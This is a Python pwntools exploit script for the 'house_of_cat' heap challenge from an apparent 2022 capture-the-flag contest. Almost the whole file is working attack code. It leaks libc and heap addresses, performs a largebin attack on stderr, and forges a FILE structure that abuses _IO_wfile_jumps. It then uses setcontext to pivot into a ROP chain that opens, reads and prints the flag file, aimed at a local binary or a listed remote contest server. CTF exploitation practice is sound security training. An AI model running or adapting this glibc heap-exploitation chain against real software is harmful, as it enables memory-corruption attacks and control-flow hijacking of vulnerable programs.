# -*- encoding: utf-8 -*-
import sys 
import os
from pwnlib import flag 
import requests
from pwn import * 
binary = './house_of_cat'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
else:
    host = '39.107.237.149'
    port = '44641'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('choice:',num)

def add(idx , size , text = 'niyah' ):
    if (text == 'niyah'):
        text = flat(0,0x21)*(size/0x10)
    sa('mew~~~~~~\n' , 'CAT | r00t QWBQWXF $' + p32(0xFFFFFFFF))
    cmd(1)
    sla('idx:' , idx)
    sla('size:' , size)
    sa('content:' , text)

def edit(idx , text):
    sa('mew~~~~~~\n' , 'CAT | r00t QWBQWXF $' + p32(0xFFFFFFFF))
    cmd(4)
    sla('idx:' , idx)
    sa('content:' , text)

def show(idx ):
    sa('mew~~~~~~\n' , 'CAT | r00t QWBQWXF $' + p32(0xFFFFFFFF))
    cmd(3)
    sla('idx:' , idx)

def delete(idx ):
    sa('mew~~~~~~\n' , 'CAT | r00t QWBQWXF $' + p32(0xFFFFFFFF))
    cmd(2)
    sla('idx:' , idx)

def pack_file(_flags = 0,
    _IO_read_ptr = 0,
    _IO_read_end = 0,
    _IO_read_base = 0,
    _IO_write_base = 0,
    _IO_write_ptr = 0,
    _IO_write_end = 0,
    _IO_buf_base = 0,
    _IO_buf_end = 0,
    _IO_save_base = 0,
    _IO_backup_base = 0,
    _IO_save_end = 0,
    _IO_marker = 0,
    _IO_chain = 0,
    _fileno = 0,
    _flags2 = 0,
    _lock = 0,
    _wide_data = 0,
    _mode = 0):
    file_struct = p32(_flags) + \
        p32(0) + \
        p64(_IO_read_ptr) + \
        p64(_IO_read_end) + \
        p64(_IO_read_base) + \
        p64(_IO_write_base) + \
        p64(_IO_write_ptr) + \
        p64(_IO_write_end) + \
        p64(_IO_buf_base) + \
        p64(_IO_buf_end) + \
        p64(_IO_save_base) + \
        p64(_IO_backup_base) + \
        p64(_IO_save_end) + \
        p64(_IO_marker) + \
        p64(_IO_chain) + \
        p32(_fileno) + \
        p32(_flags2)
    file_struct = file_struct.ljust(0x88, '\x00')
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, '\x00')
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, '\x00')
    return file_struct

# one_gad = one_gadget(libc.path)

def attack():
    
    payload = 'LOGIN | r00t QWBQWXF admin'
    sa('mew~~~~~~\n' , payload)

    add(0 , 0x428)
    add(1 , 0x468)
    delete(0)
    delete(1)

    add(2 , 0x458 ,p64(0x21)*0x42*2+p64(0)+p64(0x451))
    add(3 , 0x438 )
    delete(1)
    add(4 , 0x469 )
    show(1)
    libc.address = l64() - 0x21a0e0
    libc_base = libc.address
    l64()
    p.recv(2)
    heap_base = uu64(6) - 0x6c0
    _IO_list_all = libc.sym['stderr']
    _IO_wfile_jumps = libc.sym['_IO_wfile_jumps']
    _lock = libc_base + 0x21ba60
    setcontext = 0x53a30 + libc_base
    mprotect = libc.sym['mprotect']
    
    pop_rax_ret = libc.search(asm('pop rax; ret')).next()
    pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
    pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
    pop_rdx_ret = libc.search(asm('pop rdx; ret')).next()
    pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()
    ret = pop_rdi_ret + 1
    syscall = libc_base + 0x0EA5B9
    
    __free_hook = libc.sym['__free_hook']
    setcontext = libc.sym['setcontext']
    
    read_addr = libc.sym['read']
    open_addr = libc.sym['open']
    puts_addr = libc.sym['puts']
    
    # dbg()
    delete(0)
    payload =  p64(0x21)*0x42*2
    payload += flat(
        0,0x451,
        libc_base + 0x21a0e0 , libc_base + 0x21a0e0,
        heap_base + 0x6c0 , _IO_list_all - 0x20
    )
    add(5 , 0x458 ,payload)
    delete(3)

    add(6 , 0x458 )
    
    fake_io_addr = heap_base + 0x6c0
    file = pack_file(
        _flags = 0,
        _lock = _lock,
        _IO_write_ptr = 0xa81,
        _wide_data = fake_io_addr + 0xe0 ,
    ) + p64(_IO_wfile_jumps)
    
    flag_addr = heap_base + 0x950
    
    payload = p64(fake_io_addr + 0xe8)+'\x00'*0x98
    payload += flat(fake_io_addr + 0xe0*2+0x10 , pop_rdi_ret )
    payload += '\x00'*0x30
    payload += p64(fake_io_addr + 0xe0*2-0x68+8)
    payload += p64(setcontext+61)
    payload += flat(
        0 ,pop_rax_ret ,3 ,syscall,
        pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , pop_rax_ret ,2 , syscall,
        pop_rdi_ret , 0 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , pop_rax_ret ,0 , syscall,
        pop_rdi_ret , flag_addr , puts_addr
    ) + 'flag\x00'
    
    add(7,0x438 , file[0x40:]+payload)
    
    lg('_IO_list_all' , _IO_list_all)
    delete(6)
    delete(4)
    delete(3)
    
    edit(1 , file[0x10:0x40] )
    
    # dbg('__malloc_assert')
    dbg('_IO_wfile_overflow')
    # dbg('_IO_wdoallocbuf')
    
    #add(8,0x458)
    sa('mew~~~~~~\n' , 'CAT | r00t QWBQWXF $' + p32(0xFFFFFFFF))
    cmd(1)
    sla('idx:' , 8)
    sla('size:' , 0x458)
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   house_of_cat.py
@Time    :   2022/07/30 10:26:41
@Author  :   Niyah 
'''
